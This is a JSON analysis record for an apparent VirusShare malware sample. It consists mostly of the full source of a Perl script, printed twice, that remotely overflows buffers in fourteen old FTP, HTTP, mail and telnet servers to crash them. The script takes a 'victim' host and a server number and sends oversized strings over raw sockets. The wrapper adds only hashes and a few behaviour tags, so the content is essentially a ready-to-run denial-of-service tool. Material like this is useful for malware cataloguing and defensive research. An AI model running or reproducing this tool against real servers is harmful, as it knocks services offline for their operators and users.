{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "MKDIR": "May create a directory",
            "Windows": "May enumerate application windows",
            "open": "May open a file"
        },
        "macro": "#!/usr/bin/perl\n#####################################################################\n# Rewted Network Security Labs - www.rewted.org                     #\n# based upon advisories by USSR (www.ussrback.com) & Rewted.org\t    #\n#\t\t\t\t\t\t\t\t    #\n# Demonstration script to remotely overflow various server buffers, #\n# resulting in a denial of service, for TESTING purposes only.\t    #\n# Runs on *nix & Windows with perl.\t\t\t\t    #\n#\t\t\t\t\t\t\t\t    #\n# G6 FTP Server          v2.0 beta4/5\t\t\t\t    #\n# MDaemon httpd Server   v2.8.5.0\t\t\t\t    #\n# Avirt Mail Server      v3.5\t\t\t\t\t    #\n# BisonWare FTP Server   v3.5\t\t\t\t\t    #\n# Vermillion FTP Server  v1.23\t\t\t\t\t    #\n# ZetaMail POP3 Server   v2.1\t\t\t\t\t    #\n# WFTPD FTP Server       2.40\t\t\t\t\t    #\n# BFTelnet Server        v1.1\t\t\t\t\t    #\n# Broker FTP Server      v3.5\t\t\t\t            #\n# ExpressFS  FTP server  v2.x\t\t\t\t\t    #\n# XtraMail POP3 Server   v1.11\t\t\t\t\t    #\n# Cmail SMTP Server      v2.4\t                                    #\n# PakMail SMTP/POP3\t v1.25\t\t\t                    #\n#\t\t\t\t\t\t\t\t    #\n# slackette - warminx@null.rewted.org\t\t\t\t    #\n# www.rewted.org www.rewted.org www.rewted.org www.rewted.org \t    #\n#####################################################################\n\nuse IO::Socket;\nuse Getopt::Std;\ngetopts('h:p:t:u:v', \\%args);\nif(!defined($args{h}) && !defined($args{t})) { \nprint  qq~Usage:    $0 -h <victim> -t <number> ((-u username) | (-p password)) | -v\n\n\t-h victim to test remote overflow DoS on\n\t-t server type (check the -v option for list)\n\t-u username authorisation (required if server prompts for username)\n\t-p password authentication (required if user/passwd is expected)\n\t-v lists all servers vulnerable to each DoS\n\n~; exit; }\n\nif(defined($args{u})) { $user=$args{u}; }\nif(defined($args{p})) { $pass=$args{p}; }\nif(defined($args{v})) { &vulnerable; }\nif(defined($args{h}) && defined($args{t})){\nif(($args{t}) == 1)  { &G6;         }\nif(($args{t}) == 2)  { &mdaemon;    }\nif(($args{t}) == 3)  { &avirt;      }\nif(($args{t}) == 4)  { &bisonware;  }\nif(($args{t}) == 5)  { &vermillion; }\nif(($args{t}) == 6)  { &zetamail;   }\nif(($args{t}) == 7)  { &wftpd;      }\nif(($args{t}) == 8)  { &bftelnet;   } \nif(($args{t}) == 9)  { &broker;     } \nif(($args{t}) == 10) { &expressfs;  } \nif(($args{t}) == 11) { &xtramail;   }\nif(($args{t}) == 12) { &cmail;      }\nif(($args{t}) == 13) { &pakmail;    } \nif(($args{t}) == 14) { &pakpop;     }}\n\nsub G6 { \n$denial .= \"A\" x 2000;\n$victim=$args{h};\n\t$socket = IO::Socket::INET->new (Proto => \"tcp\",\n\t\t\t\t  \t PeerAddr => $victim,\n\t\t\t\t  \t PeerPort => \"21\") or die \"Can't connect.\\n\";\n\t$socket->autoflush(1);\nprint $socket \"$denial\\n\"; # user\nprint \"\\nSent overflow to $victim\\n\";\nclose $socket; }\n\nsub mdaemon {\n$victim=$args{h};\n$denial .= \"A\" x 1025;\n$url = \"/$denial\";\n\t$socket = IO::Socket::INET->new (Proto => \"tcp\",\n\t\t\t\t\t PeerAddr => $victim,\n\t\t\t\t\t PeerPort => \"80\") or die \"Can't connect.\\n\";\nprint $socket \"GET $url\\n\";\nprint \"\\nSent overflow to $victim\\n\";\nclose $socket; }\n\nsub avirt { \n$victim=$args{h};\n$denial .= \"A\" x 856;\n\t$socket = IO::Socket::INET->new (Proto => \"tcp\",\n\t\t\t                 PeerAddr => $victim,\n                \t\t\t PeerPort => \"25\") or die \"Can't connect\\n\";\n        $socket->autoflush(1);\nprint $socket \"user $user\\n\";\nprint $socket \"pass $denial\\n\";\nprint \"\\nSent overflow to $victim\\n\";\nclose $socket; }\n\nsub bisonware {\n$victim=$args{h};\n$denial .= \"A\" x 2000;\n\t$socket = IO::Socket::INET->new (Proto => \"tcp\",\n\t\t\t                 PeerAddr => $victim,\n                \t\t\t PeerPort => \"21\") or die \"Can't connect\\n\";\n        $socket->autoflush(1);\nprint $socket \"$denial\\n\";\nprint \"\\nSent overflow to $victim\\n\";\nclose $socket; }\n\nsub vermillion {\n$victim=$args{h};\n$denial .= \"A\" x 504;\n\t$socket = IO::Socket::INET->new (Proto => \"tcp\",\n\t\t\t                 PeerAddr => $victim,\n                \t\t\t PeerPort => \"21\") or die \"Can't connect\\n\";\n        $socket->autoflush(1);\nprint $socket \"$user\\n\";\nprint $socket \"$pass\\n\";\nprint $socket \"cwd $denial\\n\";\n# for(i=0; i<=3; i++) { print $socket \"CWD $denial\\n\"; }\nprint \"\\nSent overflow to $victim\\n\";\nclose $socket; }\n\nsub zetamail {\n$victim=$args{h};\n$denial .= \"A\" x 3500;\n\t$socket = IO::Socket::INET->new (Proto => \"tcp\",\n\t\t\t\t\t PeerAddr => $victim,\n\t\t\t\t\t PeerPort => \"110\") or die \"Can't connect.\\n\";\nprint $socket \"user $denial\\n\"; \nprint $socket \"pass $denial\\n\";\nprint \"\\nSent overflow to $victim\\n\";\nclose $socket; }\n\nsub wftpd {\n$victim=$args{h};\n$denial .= \"A\" x 255;\n\t$socket = IO::Socket::INET->new (Proto => \"tcp\",\n\t\t\t\t\t PeerAddr => $victim,\n\t\t\t\t\t PeerPort => \"21\") or die \"Can't connect.\\n\";\nprint $socket \"$user\\n\";\nprint $socket \"$pass\\n\";\nprint $socket \"MKDIR $denial\\n\";\nprint $socket \"CWD $denial\\n\";\nprint \"\\nSent overflow to $victim\\n\";\nclose $socket; }\n\nsub bftelnet {\n# use Net::Telnet;\n$victim=$args{h};\n$denial .= \"A\" x 3090;\n$telnet = new Net::Telnet ( Timeout =>10,\n\t\t\t    Errmode =>'die');\n$telnet->open('$victim');\n$telnet->waitfor('/Login: $/i');\n$telnet->print('$denial');\nprint \"\\nSent overflow to $victim\\n\";\nclose $telnet; }\n\nsub broker {\n$victim=$args{h};\n$denial .= \"A\" x 2730;\n\t$socket = IO::Socket::INET->new (Proto => \"tcp\",\n\t\t\t                 PeerAddr => $victim,\n                \t\t\t PeerPort => \"21\") or die \"Can't connect.\\n\";\nprint $socket \"$denial\\n\";\nprint \"\\nSent overflow to $victim\\n\";\nclose $socket; }\n\n\nsub expressfs {\n$victim=$args{h};\n$denial .= \"A\" x 654;\n\t$socket = IO::Socket::INET->new (Proto => \"tcp\",\n\t\t\t                 PeerAddr => $victim,\n                \t\t\t PeerPort => \"21\") or die \"Can't connect.\\n\";\nprint $socket \"$denial\\n\";\nprint $socket \"AAAAAAAAAAAAAAAAAAA\\n\";\nprint \"\\nSent overflow to $victim\\n\";\nclose $socket; }\n\nsub xtramail {\n$victim=$args{h};\n$denial .= \"A\" x 2930;\n\t$socket = IO::Socket::INET->new (Proto => \"tcp\",\n\t\t\t\t\t PeerAddr => $victim,\n\t\t\t\t\t PeerPort => \"25\") or die \"Can't connect.\\n\";\nprint $socket \"MAIL FROM: test\\@localhost\\n\";\nprint $socket \"RCPT TO: $denial\\@localhost\\n\";\nprint \"\\nSent overflow to $victim\\n\";\nclose $socket; }\n\nsub cmail {\n$victim=$args{h};\n$denial .= \"A\" x 7090;\n\t$socket = IO::Socket::INET->new (Proto => \"tcp\",\n\t\t\t\t\t PeerAddr => $victim,\n\t\t\t\t\t PeerPort => \"25\") or die \"Can't connect.\\n\";\nprint $socket \"MAIL FROM: $denial\\@localhost\\n\";\nprint \"\\nSent overflow to $victim\\n\";\nclose $socket; }\n\nsub pakmail {\n$victim=$args{h};\n$denial .= \"A\" x 1390;\n\t$socket = IO::Socket::INET->new (Proto => \"tcp\",\n\t\t\t\t\t PeerAddr => $victim,\n\t\t\t\t\t PeerPort => \"25\") or die \"Can't connect.\\n\";\nprint $socket \"MAIL FROM: test\\@localhost\\n\";\nprint $socket \"RCPT TO: $denial\\@localhost\\n\";\nprint \"\\nSent overflow to $victim\\n\";\nclose $socket; }\n\nsub pakpop {\n$victim=$args{h};\n$denial .= \"A\" x 1400;\n\t$socket = IO::Socket::INET->new (Proto => \"tcp\",\n\t\t\t\t\t PeerAddr => $victim,\n\t\t\t\t\t PeerPort => \"110\") or die \"Can't connect.\\n\";\nprint $socket \"user test\\n\";\nprint $socket \"pass $denial\\n\";\nprint \"\\nSent overflow to $victim\\n\";\nclose $socket; }\n\nsub vulnerable {\nprint qq~\n ______________________________________________________________________________\n    Vulnerable Daemon        Version         Vulnerable Daemon         Version\n ______________________________________________________________________________\n\n [1] G6 FTP Server           v2.0b4/5     [2] MDaemon httpd Server     v2.8.5.0\n\n [3] Avirt Mail Server       v3.5         [4] BisonWare FTP Server     v3.5\n\n [5] Vermillion FTP Server   v1.23        [6] ZetaMail SMTP Server     v2.1\n\n [7] WFTPD FTP Server        v2.40        [8] BFTelnet Server          v1.1\n\n [9] Broker FTP Server       v3.5        [10] ExpressFS FTP Server     v2.x \n\n[11] XtraMail POP3 Server    v1.11       [12] Cmail SMTP Server        v2.4\n\n[13] PakMail SMTP Server     v1.25       [14] PakMail POP3 Server      v1.25\n\n~; exit; }"
    },
    "filename": "VirusShare_2f10b017831e0c56990da1465494c3af",
    "filesize": 7747,
    "filetype": "Perl script text executable",
    "hashes": {
        "md5": "2f10b017831e0c56990da1465494c3af",
        "sha1": "379de5d7b70e5f09e16501cbb58db0728125228b",
        "sha256": "a65037de1510ccc5626b3a9322e4061a818bffbb2f6cf59e1ba5aef2bfd14477"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "#!/usr/bin/perl",
            "#####################################################################",
            "# Rewted Network Security Labs - www.rewted.org                     #",
            "# based upon advisories by USSR (www.ussrback.com) & Rewted.org\t    #",
            "#\t\t\t\t\t\t\t\t    #",
            "# Demonstration script to remotely overflow various server buffers, #",
            "# resulting in a denial of service, for TESTING purposes only.\t    #",
            "# Runs on *nix & Windows with perl.\t\t\t\t    #",
            "#\t\t\t\t\t\t\t\t    #",
            "# G6 FTP Server          v2.0 beta4/5\t\t\t\t    #",
            "# MDaemon httpd Server   v2.8.5.0\t\t\t\t    #",
            "# Avirt Mail Server      v3.5\t\t\t\t\t    #",
            "# BisonWare FTP Server   v3.5\t\t\t\t\t    #",
            "# Vermillion FTP Server  v1.23\t\t\t\t\t    #",
            "# ZetaMail POP3 Server   v2.1\t\t\t\t\t    #",
            "# WFTPD FTP Server       2.40\t\t\t\t\t    #",
            "# BFTelnet Server        v1.1\t\t\t\t\t    #",
            "# Broker FTP Server      v3.5\t\t\t\t            #",
            "# ExpressFS  FTP server  v2.x\t\t\t\t\t    #",
            "# XtraMail POP3 Server   v1.11\t\t\t\t\t    #",
            "# Cmail SMTP Server      v2.4\t                                    #",
            "# PakMail SMTP/POP3\t v1.25\t\t\t                    #",
            "#\t\t\t\t\t\t\t\t    #",
            "# slackette - warminx@null.rewted.org\t\t\t\t    #",
            "# www.rewted.org www.rewted.org www.rewted.org www.rewted.org \t    #",
            "#####################################################################",
            "use IO::Socket;",
            "use Getopt::Std;",
            "getopts('h:p:t:u:v', \\%args);",
            "if(!defined($args{h}) && !defined($args{t})) { ",
            "print  qq~Usage:    $0 -h <victim> -t <number> ((-u username) | (-p password)) | -v",
            "\t-h victim to test remote overflow DoS on",
            "\t-t server type (check the -v option for list)",
            "\t-u username authorisation (required if server prompts for username)",
            "\t-p password authentication (required if user/passwd is expected)",
            "\t-v lists all servers vulnerable to each DoS",
            "~; exit; }",
            "if(defined($args{u})) { $user=$args{u}; }",
            "if(defined($args{p})) { $pass=$args{p}; }",
            "if(defined($args{v})) { &vulnerable; }",
            "if(defined($args{h}) && defined($args{t})){",
            "if(($args{t}) == 1)  { &G6;         }",
            "if(($args{t}) == 2)  { &mdaemon;    }",
            "if(($args{t}) == 3)  { &avirt;      }",
            "if(($args{t}) == 4)  { &bisonware;  }",
            "if(($args{t}) == 5)  { &vermillion; }",
            "if(($args{t}) == 6)  { &zetamail;   }",
            "if(($args{t}) == 7)  { &wftpd;      }",
            "if(($args{t}) == 8)  { &bftelnet;   } ",
            "if(($args{t}) == 9)  { &broker;     } ",
            "if(($args{t}) == 10) { &expressfs;  } ",
            "if(($args{t}) == 11) { &xtramail;   }",
            "if(($args{t}) == 12) { &cmail;      }",
            "if(($args{t}) == 13) { &pakmail;    } ",
            "if(($args{t}) == 14) { &pakpop;     }}",
            "sub G6 { ",
            "$denial .= \"A\" x 2000;",
            "$victim=$args{h};",
            "\t$socket = IO::Socket::INET->new (Proto => \"tcp\",",
            "\t\t\t\t  \t PeerAddr => $victim,",
            "\t\t\t\t  \t PeerPort => \"21\") or die \"Can't connect.\\n\";",
            "\t$socket->autoflush(1);",
            "print $socket \"$denial\\n\"; # user",
            "print \"\\nSent overflow to $victim\\n\";",
            "close $socket; }",
            "sub mdaemon {",
            "$victim=$args{h};",
            "$denial .= \"A\" x 1025;",
            "$url = \"/$denial\";",
            "\t$socket = IO::Socket::INET->new (Proto => \"tcp\",",
            "\t\t\t\t\t PeerAddr => $victim,",
            "\t\t\t\t\t PeerPort => \"80\") or die \"Can't connect.\\n\";",
            "print $socket \"GET $url\\n\";",
            "print \"\\nSent overflow to $victim\\n\";",
            "close $socket; }",
            "sub avirt { ",
            "$victim=$args{h};",
            "$denial .= \"A\" x 856;",
            "\t$socket = IO::Socket::INET->new (Proto => \"tcp\",",
            "\t\t\t                 PeerAddr => $victim,",
            "                \t\t\t PeerPort => \"25\") or die \"Can't connect\\n\";",
            "        $socket->autoflush(1);",
            "print $socket \"user $user\\n\";",
            "print $socket \"pass $denial\\n\";",
            "print \"\\nSent overflow to $victim\\n\";",
            "close $socket; }",
            "sub bisonware {",
            "$victim=$args{h};",
            "$denial .= \"A\" x 2000;",
            "\t$socket = IO::Socket::INET->new (Proto => \"tcp\",",
            "\t\t\t                 PeerAddr => $victim,",
            "                \t\t\t PeerPort => \"21\") or die \"Can't connect\\n\";",
            "        $socket->autoflush(1);",
            "print $socket \"$denial\\n\";",
            "print \"\\nSent overflow to $victim\\n\";",
            "close $socket; }",
            "sub vermillion {",
            "$victim=$args{h};",
            "$denial .= \"A\" x 504;",
            "\t$socket = IO::Socket::INET->new (Proto => \"tcp\",",
            "\t\t\t                 PeerAddr => $victim,",
            "                \t\t\t PeerPort => \"21\") or die \"Can't connect\\n\";",
            "        $socket->autoflush(1);",
            "print $socket \"$user\\n\";",
            "print $socket \"$pass\\n\";",
            "print $socket \"cwd $denial\\n\";",
            "# for(i=0; i<=3; i++) { print $socket \"CWD $denial\\n\"; }",
            "print \"\\nSent overflow to $victim\\n\";",
            "close $socket; }",
            "sub zetamail {",
            "$victim=$args{h};",
            "$denial .= \"A\" x 3500;",
            "\t$socket = IO::Socket::INET->new (Proto => \"tcp\",",
            "\t\t\t\t\t PeerAddr => $victim,",
            "\t\t\t\t\t PeerPort => \"110\") or die \"Can't connect.\\n\";",
            "print $socket \"user $denial\\n\"; ",
            "print $socket \"pass $denial\\n\";",
            "print \"\\nSent overflow to $victim\\n\";",
            "close $socket; }",
            "sub wftpd {",
            "$victim=$args{h};",
            "$denial .= \"A\" x 255;",
            "\t$socket = IO::Socket::INET->new (Proto => \"tcp\",",
            "\t\t\t\t\t PeerAddr => $victim,",
            "\t\t\t\t\t PeerPort => \"21\") or die \"Can't connect.\\n\";",
            "print $socket \"$user\\n\";",
            "print $socket \"$pass\\n\";",
            "print $socket \"MKDIR $denial\\n\";",
            "print $socket \"CWD $denial\\n\";",
            "print \"\\nSent overflow to $victim\\n\";",
            "close $socket; }",
            "sub bftelnet {",
            "# use Net::Telnet;",
            "$victim=$args{h};",
            "$denial .= \"A\" x 3090;",
            "$telnet = new Net::Telnet ( Timeout =>10,",
            "\t\t\t    Errmode =>'die');",
            "$telnet->open('$victim');",
            "$telnet->waitfor('/Login: $/i');",
            "$telnet->print('$denial');",
            "print \"\\nSent overflow to $victim\\n\";",
            "close $telnet; }",
            "sub broker {",
            "$victim=$args{h};",
            "$denial .= \"A\" x 2730;",
            "\t$socket = IO::Socket::INET->new (Proto => \"tcp\",",
            "\t\t\t                 PeerAddr => $victim,",
            "                \t\t\t PeerPort => \"21\") or die \"Can't connect.\\n\";",
            "print $socket \"$denial\\n\";",
            "print \"\\nSent overflow to $victim\\n\";",
            "close $socket; }",
            "sub expressfs {",
            "$victim=$args{h};",
            "$denial .= \"A\" x 654;",
            "\t$socket = IO::Socket::INET->new (Proto => \"tcp\",",
            "\t\t\t                 PeerAddr => $victim,",
            "                \t\t\t PeerPort => \"21\") or die \"Can't connect.\\n\";",
            "print $socket \"$denial\\n\";",
            "print $socket \"AAAAAAAAAAAAAAAAAAA\\n\";",
            "print \"\\nSent overflow to $victim\\n\";",
            "close $socket; }",
            "sub xtramail {",
            "$victim=$args{h};",
            "$denial .= \"A\" x 2930;",
            "\t$socket = IO::Socket::INET->new (Proto => \"tcp\",",
            "\t\t\t\t\t PeerAddr => $victim,",
            "\t\t\t\t\t PeerPort => \"25\") or die \"Can't connect.\\n\";",
            "print $socket \"MAIL FROM: test\\@localhost\\n\";",
            "print $socket \"RCPT TO: $denial\\@localhost\\n\";",
            "print \"\\nSent overflow to $victim\\n\";",
            "close $socket; }",
            "sub cmail {",
            "$victim=$args{h};",
            "$denial .= \"A\" x 7090;",
            "\t$socket = IO::Socket::INET->new (Proto => \"tcp\",",
            "\t\t\t\t\t PeerAddr => $victim,",
            "\t\t\t\t\t PeerPort => \"25\") or die \"Can't connect.\\n\";",
            "print $socket \"MAIL FROM: $denial\\@localhost\\n\";",
            "print \"\\nSent overflow to $victim\\n\";",
            "close $socket; }",
            "sub pakmail {",
            "$victim=$args{h};",
            "$denial .= \"A\" x 1390;",
            "\t$socket = IO::Socket::INET->new (Proto => \"tcp\",",
            "\t\t\t\t\t PeerAddr => $victim,",
            "\t\t\t\t\t PeerPort => \"25\") or die \"Can't connect.\\n\";",
            "print $socket \"MAIL FROM: test\\@localhost\\n\";",
            "print $socket \"RCPT TO: $denial\\@localhost\\n\";",
            "print \"\\nSent overflow to $victim\\n\";",
            "close $socket; }",
            "sub pakpop {",
            "$victim=$args{h};",
            "$denial .= \"A\" x 1400;",
            "\t$socket = IO::Socket::INET->new (Proto => \"tcp\",",
            "\t\t\t\t\t PeerAddr => $victim,",
            "\t\t\t\t\t PeerPort => \"110\") or die \"Can't connect.\\n\";",
            "print $socket \"user test\\n\";",
            "print $socket \"pass $denial\\n\";",
            "print \"\\nSent overflow to $victim\\n\";",
            "close $socket; }",
            "sub vulnerable {",
            "print qq~",
            " ______________________________________________________________________________",
            "    Vulnerable Daemon        Version         Vulnerable Daemon         Version",
            " ______________________________________________________________________________",
            " [1] G6 FTP Server           v2.0b4/5     [2] MDaemon httpd Server     v2.8.5.0",
            " [3] Avirt Mail Server       v3.5         [4] BisonWare FTP Server     v3.5",
            " [5] Vermillion FTP Server   v1.23        [6] ZetaMail SMTP Server     v2.1",
            " [7] WFTPD FTP Server        v2.40        [8] BFTelnet Server          v1.1",
            " [9] Broker FTP Server       v3.5        [10] ExpressFS FTP Server     v2.x ",
            "[11] XtraMail POP3 Server    v1.11       [12] Cmail SMTP Server        v2.4",
            "[13] PakMail SMTP Server     v1.25       [14] PakMail POP3 Server      v1.25",
            "~; exit; }"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.307676",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
